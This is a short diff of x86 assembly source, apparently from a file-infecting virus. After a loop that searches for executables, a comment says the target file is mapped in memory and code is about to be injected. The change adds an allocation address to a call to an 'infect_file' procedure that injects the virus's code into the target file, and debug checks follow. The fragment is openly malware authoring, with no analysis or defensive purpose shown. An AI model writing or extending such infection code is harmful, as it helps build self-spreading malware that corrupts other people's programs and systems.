@@ -80,7 +80,7 @@ search_exe_loop:
 
 ; --------------------------------------> OK guys, now we have our file mapped in memory. Let's inject some code !
 
-	invoke	infect_file, fileptr		; Procedure to properly inject our code into the file of interest.
+	invoke	infect_file, fileptr, virtualalloc_addr		; Procedure to properly inject our code into the file of interest.
 
 	cmp		eax, 0								; DEBUG: if eax == 0 sth went wrong, print debug
 	jne		infect_dbg							; DEBUG
